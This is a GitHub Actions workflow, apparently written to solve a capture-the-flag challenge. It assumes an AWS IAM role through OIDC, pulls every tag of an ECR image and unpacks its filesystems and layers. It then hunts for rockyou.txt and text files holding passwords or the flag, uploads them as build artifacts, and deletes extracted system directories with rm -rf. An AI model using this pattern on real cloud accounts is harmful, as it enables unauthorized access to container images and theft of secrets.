name: Assume AWS Role
on: [push]
jobs:
  assume-role:
    runs-on: self-hosted
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: ap-east-1
          role-session-name: OIDCSession
      - name: Login to ECR
        run: |
          aws ecr get-login-password --region ap-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.ap-east-1.amazonaws.com
      - name: List all tags for imaginary-challenge
        run: |
          aws ecr list-images --repository-name challenges/imaginary-challenge --region ap-east-1 --query 'imageIds[].imageTag' --output text
      - name: Pull all versions of imaginary-challenge
        run: |
          # Get all image tags
          TAGS=$(aws ecr list-images --repository-name challenges/imaginary-challenge --region ap-east-1 --query 'imageIds[].imageTag' --output text)
          echo "Available tags: $TAGS"
          
          for TAG in $TAGS; do
            if [ "$TAG" != "None" ] && [ -n "$TAG" ]; then
              echo "Pulling tag: $TAG"
              docker pull 396961015104.dkr.ecr.ap-east-1.amazonaws.com/challenges/imaginary-challenge:$TAG
              
              # Create a container from the image to explore its filesystem
              CONTAINER_ID=$(docker create 396961015104.dkr.ecr.ap-east-1.amazonaws.com/challenges/imaginary-challenge:$TAG)
              
              # Extract the entire filesystem
              docker export $CONTAINER_ID > fs_$TAG.tar
              tar -xf fs_$TAG.tar
              
              # Search for rockyou.txt in the extracted filesystem
              if find . -name "rockyou.txt" -type f | grep -q "."; then
                echo "FOUND rockyou.txt in tag: $TAG"
                find . -name "rockyou.txt" -type f -exec cp {} ./rockyou_$TAG.txt \;
                echo "Copied to ./rockyou_$TAG.txt"
              fi
              
              # Also look for any .txt files that might contain passwords or the flag
              if find . -name "*.txt" -type f | grep -q "."; then
                echo "Found text files in tag $TAG:"
                find . -name "*.txt" -type f -exec ls -la {} \;
                # Copy all text files for inspection
                find . -name "*.txt" -type f -exec cp {} ./ \;
              fi
              
              # Clean up
              docker rm $CONTAINER_ID
              rm -f fs_$TAG.tar
              rm -rf bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
            fi
          done
      - name: Check Docker image layers
        run: |
          # Also inspect the latest image layers more thoroughly
          docker pull 396961015104.dkr.ecr.ap-east-1.amazonaws.com/challenges/imaginary-challenge:latest
          docker save 396961015104.dkr.ecr.ap-east-1.amazonaws.com/challenges/imaginary-challenge:latest -o image_latest.tar
          tar -xf image_latest.tar
          
          # Extract all layers
          for LAYER in $(find . -name "*.tar" -type f); do
            echo "Extracting layer: $LAYER"
            tar -xf $LAYER -C ./layer_extracted 2>/dev/null || true
          done
          
          # Search in all layers
          if find ./layer_extracted -name "rockyou.txt" -type f | grep -q "."; then
            echo "FOUND rockyou.txt in layers!"
            find ./layer_extracted -name "rockyou.txt" -type f -exec cp {} ./ \;
          fi
          
          if find ./layer_extracted -name "*.txt" -type f | grep -q "."; then
            echo "Found text files in layers:"
            find ./layer_extracted -name "*.txt" -type f -exec ls -la {} \;
            find ./layer_extracted -name "*.txt" -type f -exec cp {} ./ \;
          fi
      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: extracted-files
          path: |
            *.txt
            rockyou*
